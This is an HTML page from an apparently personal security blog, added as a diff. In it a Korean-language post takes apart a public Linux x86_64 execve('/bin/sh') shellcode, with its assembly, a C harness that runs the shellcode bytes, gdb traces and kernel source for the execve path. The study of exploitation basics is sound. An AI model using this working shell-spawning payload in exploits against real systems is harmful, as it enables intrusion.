@@ -1,0 +1,406 @@
+
+<!DOCTYPE html>
+<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
+<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
+<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  <title>Linux X86_64 Shellcode - My Octopress Blog</title>
+  <meta name="author" content="Your Name">
+
+  
+  <meta name="description" content="Linux x86_64 shellcode section .text global _start
+_start: xor rdx,rdx mov qword rbx, '//bin/sh' shr rbx,0x8 push rbx mov rdi,rsp xor rax,rax push &hellip;">
+  
+
+  <!-- http://t.co/dKP3o1e -->
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  
+  <link rel="canonical" href="http://yoursite.com/blog/2014/11/08/linux-x86-64-shellcode/">
+  <link href="/favicon.png" rel="icon">
+  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
+  <link href="/atom.xml" rel="alternate" title="My Octopress Blog" type="application/atom+xml">
+  <script src="/javascripts/modernizr-2.0.js"></script>
+  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
+  <script>!window.jQuery && document.write(unescape('%3Cscript src="/javascripts/libs/jquery.min.js"%3E%3C/script%3E'))</script>
+  <script src="/javascripts/octopress.js" type="text/javascript"></script>
+  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
+<link href="//fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+<link href="//fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+
+  
+
+</head>
+
+<body   >
+  <header role="banner"><hgroup>
+  <h1><a href="/">My Octopress Blog</a></h1>
+  
+    <h2>A blogging framework for hackers.</h2>
+  
+</hgroup>
+
+</header>
+  <nav role="navigation"><ul class="subscription" data-subscription="rss">
+  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
+  
+</ul>
+  
+<form action="https://www.google.com/search" method="get">
+  <fieldset role="search">
+    <input type="hidden" name="sitesearch" value="yoursite.com">
+    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
+  </fieldset>
+</form>
+  
+<ul class="main-navigation">
+  <li><a href="/">Blog</a></li>
+  <li><a href="/blog/archives">Archives</a></li>
+</ul>
+
+</nav>
+  <div id="main">
+    <div id="content">
+      <div>
+<article class="hentry" role="article">
+  
+  <header>
+    
+      <h1 class="entry-title">Linux X86_64 Shellcode</h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2014-11-08T15:49:47+09:00'><span class='date'><span class='date-month'>Nov</span> <span class='date-day'>8</span><span class='date-suffix'>th</span>, <span class='date-year'>2014</span></span> <span class='time'>3:49 pm</span></time>
+        
+      </p>
+    
+  </header>
+
+
+<div class="entry-content"><p><a href="http://www.exploit-db.com/exploits/13691">Linux x86_64 shellcode</a></p>
+
+<pre><code>section .text
+    global _start
+_start:
+    xor rdx,rdx
+    mov qword rbx, '//bin/sh'
+    shr rbx,0x8
+    push rbx
+    mov rdi,rsp
+    xor rax,rax
+    push rax
+    push rdi
+    mov rsi,rsp
+    mov al,0x3b
+    syscall
+
+int main(void)
+{
+    //void (*p)();
+    char *shellcode = ""
+        "\x48\x31\xd2"
+        "\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68"
+        "\x48\xc1\xeb\x08"
+        "\x53"
+        "\x48\x89\xe7"  /* mov rdi,rsp */
+        "\x48\x31\xc0"  /* xor rax,rax */
+        "\x50"          /* push rax */
+        "\x57"
+        "\x48\x89\xe6"
+        "\xb0\x3b"
+        "\x0f\x05" ;
+
+    //p = (void(*)()) shellcode;
+    //(*p)();
+    (*(void(*)())shellcode)()
+}
+
+$ gcc -g a.c
+$ gdb a.out
+(gdb) break 18
+Breakpoint 1 at 0x4004c4: file a.c, line 18.
+(gdb) run
+Starting program: /home/z/shell/a.out
+warning: no loadable section found in added symbol-file system-supplied DSO at 0x7ffff7ffa000
+
+Breakpoint 1, main() at a.c:18
+18          (*(void(*)())shellcode)();
+(gdb) disassemble
+Dump of assembler code for function main:
+   0x00000000004004b4 &lt;+0&gt;:     push   %rbp
+   0x00000000004004b5 &lt;+1&gt;:     mov    %rsp,%rbp
+   0x00000000004004b8 &lt;+4&gt;:     sub    $0x10,%rsp
+   0x00000000004004bc &lt;+8&gt;:     movq   $0x4005d0,-0x8(%rbp)
+=&gt; 0x00000000004004c4 &lt;+16&gt;:    mov    -0x8(%rbp),%rdx
+   0x00000000004004c8 &lt;+20&gt;:    mov    $0x0,%eax
+   0x00000000004004cd &lt;+25&gt;:    callq  *%rdx
+   0x00000000004004cf &lt;+27&gt;:    leaveq
+   0x00000000004004d0 &lt;+28&gt;:    retq
+End of assembler dump.
+(gdb) x $rbp-0x8
+0x7fffffffe038: 0x004005d0
+</code></pre>
+
+<p>0x004005d0 부터 shellcode 가 들어있는 것을 확인</p>
+
+<p><code>movabs $0x68732f6e69622f2f,%rbx</code> 로 <code>//bin/sh</code> 을 <code>%rbx</code> 에 집어넣고,
+, 오른쪽으로 8 bit shift 해서,
+<code>/bin/sh\x00</code> 을 만든다.</p>
+
+<p>그리고, 이를 push 해서, 메모리에</p>
+
+<pre><code>00 NULL  &lt;-- High
+68 'h'
+73 's'
+2f '/'
+6e 'n'
+69 'i'
+62 'b'
+2f '/'   &lt;-- Low (%rsp)
+</code></pre>
+
+<p>를 만든다.</p>
+
+<p><a href="https://filippo.io/linux-syscall-table">Searchable Linux Syscall Table for x86 and x86_64</a> 에서 64-bit 를 참조.</p>
+
+<pre><code>Instruction: `syscall`
+Return value found in: `%rax`
+rax: system call number
+rdi: name 
+rsi: argv 
+rdx: envp
+</code></pre>
+
+<p><code>0x3b</code> 는 execve 로 <code>linux/fs/exec.c</code> 에 구현되어있다. <code>syscall</code> 인터페이스는 <code>arch/x86_64/kernel/entry.S</code> 를 보면 된다.</p>
+
+<pre><code>/*
+ * execve(). This function needs to use IRET, not SYSRET, to set up all state properly.
+ *
+ * C extern interface:
+ *       extern long execve(char *name, char **argv, char **envp)
+ *
+ * asm input arguments:
+ *      rdi: name, rsi: argv, rdx: envp
+ *
+ * We want to fallback into:
+ *      extern long sys_execve(char *name, char **argv, char **envp, struct pt_regs regs)
+ *
+ * do_sys_execve asm fallback arguments:
+ *      rdi: name, rsi: argv, rdx: envp, fake frame on the stack
+ */
+ENTRY(execve)
+        FAKE_STACK_FRAME $0
+        SAVE_ALL
+        call sys_execve
+        movq %rax, RAX(%rsp)
+        RESTORE_REST
+        testq %rax,%rax
+        je int_ret_from_sys_call
+        RESTORE_ARGS
+        UNFAKE_STACK_FRAME
+        ret
+</code></pre>
+
+<p><code>arch/x86/kernel/process_64.c</code> 에 sys_execve() 가 있고, 이게</p>
+
+<pre><code>/*
+ * sys_execve() executes a new program.
+ */
+asmlinkage
+long sys_execve(const char __user *name, const char __user *const __user *argv, const char __user *const __user *envp)
+</code></pre>
+
+<p><code>/fs/exec.c</code> 에 있는 <code>do_execve()</code> 를 호출한다. <a href="http://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/tree/fs/exec.c">fs/exec.c</a></p>
+
+<pre><code>/*
+ * linux/fs/exec.c
+ */
+...
+int do_execve(struct filename *filename,
+        const char __user *const __user *__argv,
+        const char __user *const __user *__envp)
+{
+    struct user_arg_ptr argv = { .ptr.native = __argv };
+    struct user_arg_ptr envp = { .ptr.native = __envp };
+    return do_execve_common(filename, argv, envp);
+}
+</code></pre>
+
+<p>이제 다시 shellcode 를 disassemble 해본다.</p>
+
+<pre><code>Instruction: `syscall`
+Return value found in: `%rax`
+rax: system call number
+rdi: name 
+rsi: argv 
+rdx: envp
+</code></pre>
+
+<p><code>%rdx</code> 를 0 으로 만들었다.</p>
+
+<pre><code>=&gt; 0x00000000004005d0:  xor    %rdx,%rdx
+</code></pre>
+
+<p>이 세 인스트럭션으로 메모리에 <code>/bin/sh\x00</code> 을 깔았다.</p>
+
+<pre><code>   0x00000000004005d3:  movabs $0x68732f6e69622f2f,%rbx
+   0x00000000004005dd:  shr    $0x8,%rbx
+   0x00000000004005e1:  push   %rbx
+</code></pre>
+
+<p>이제 이 메모리 주소를 <code>%rdi</code> 에 셋업한다. <code>name</code> 이 된다. <code>do_execve(name,...)</code></p>
+
+<pre><code>   0x00000000004005e2:  mov    %rsp,%rdi
+</code></pre>
+
+<p>이제 <code>%rsi</code> 에 argv 를 셋업한다. 이해가 안가는 곳은 <code>push %rax</code> 이다. 항상 0 이 될 수 있을까? 이걸 수정해서 새버전을 만들었다. <code>xor %rax,%rax</code> 를 <code>push %rax</code> 전에 넣으면 된다.</p>
+
+<pre><code>   0x00000000004005e5:  push   %rax  ; argv[1] : NULL pointer
+   0x00000000004005e6:  push   %rdi  ; argv[0] : pointer to '/bin/sh\0'
+   0x00000000004005e7:  mov    %rsp,%rsi ; %rsi points argv[0]
+</code></pre>
+
+<p>이제 <code>%rdx (envp)</code> 는 NULL, <code>%rsi</code> 는 argv[0], <code>%rdi</code> 는 filename 이 셋업되었다.</p>
+
+<p><code>%ax</code> 에 <code>execve</code> 를 넣고 syscall 을 수행한다.</p>
+
+<pre><code>(gdb) x 0x004005d0
+0x4005d0:       0x48d23148
+(gdb) stepi
+...
+(gdb) stepi
+(gdb) disassemble $rdx,+30
+Dump of assembler code from 0x4005d0 to 0x4005ee:
+=&gt; 0x00000000004005d0:  xor    %rdx,%rdx
+   0x00000000004005d3:  movabs $0x68732f6e69622f2f,%rbx
+   0x00000000004005dd:  shr    $0x8,%rbx
+   0x00000000004005e1:  push   %rbx
+   0x00000000004005e2:  mov    %rsp,%rdi
+   0x00000000004005e5:  push   %rax
+   0x00000000004005e6:  push   %rdi
+   0x00000000004005e7:  mov    %rsp,%rsi
+   0x00000000004005ea:  mov    $0x3b,%al
+   0x00000000004005ec:  syscall
+End of assembler dump.
+(gdb)
+</code></pre>
+</div>
+
+
+  <footer>
+    <p class="meta">
+      
+  
+
+<span class="byline author vcard">Posted by <span class="fn">Your Name</span></span>
+
+      
+
+
+
+
+<time class='entry-date' datetime='2014-11-08T15:49:47+09:00'><span class='date'><span class='date-month'>Nov</span> <span class='date-day'>8</span><span class='date-suffix'>th</span>, <span class='date-year'>2014</span></span> <span class='time'>3:49 pm</span></time>
+      
+
+
+    </p>
+    
+      <div class="sharing">
+  
+  <a href="//twitter.com/share" class="twitter-share-button" data-url="http://yoursite.com/blog/2014/11/08/linux-x86-64-shellcode/" data-via="" data-counturl="http://yoursite.com/blog/2014/11/08/linux-x86-64-shellcode/" >Tweet</a>
+  
+  
+  
+</div>
+
+    
+    <p class="meta">
+      
+        <a class="basic-alignment left" href="/blog/2014/11/07/android-toolchain/" title="Previous Post: Android Toolchain">&laquo; Android Toolchain</a>
+      
+      
+        <a class="basic-alignment right" href="/blog/2014/11/09/linux-x86-64-shellcode-2/" title="Next Post: Linux x86_64 shellcode 2">Linux x86_64 shellcode 2 &raquo;</a>
+      
+    </p>
+  </footer>
+</article>
+
+</div>
+
+<aside class="sidebar">
+  
+    <section>
+  <h1>Recent Posts</h1>
+  <ul id="recent_posts">
+    
+      <li class="post">
+        <a href="/blog/2015/10/04/return-oriented-programming-for-the-arm-architecture/">Return Oriented Programming for the ARM Architecture</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2015/10/02/the-inside-story-behind-ms08-067/">The Inside Story Behind MS08-067</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2015/09/17/rop-and-arm/">ROP and ARM</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2015/09/13/sophail-applied-attacks-against-sophos-antivirus/">Sophail: Applied Attacks Against Sophos Antivirus</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2015/09/13/stagefright/">Stagefright</a>
+      </li>
+    
+  </ul>
+</section>
+
+
+
+
+
+  
+</aside>
+
+
+    </div>
+  </div>
+  <footer role="contentinfo"><p>
+  Copyright &copy; 2015 - Your Name -
+  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
+</p>
+
+</footer>
+  
+
+
+
+
+
+
+
+  <script type="text/javascript">
+    (function(){
+      var twitterWidgets = document.createElement('script');
+      twitterWidgets.type = 'text/javascript';
+      twitterWidgets.async = true;
+      twitterWidgets.src = '//platform.twitter.com/widgets.js';
+      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
+    })();
+  </script>
+
+
+
+
+
+</body>
+</html>
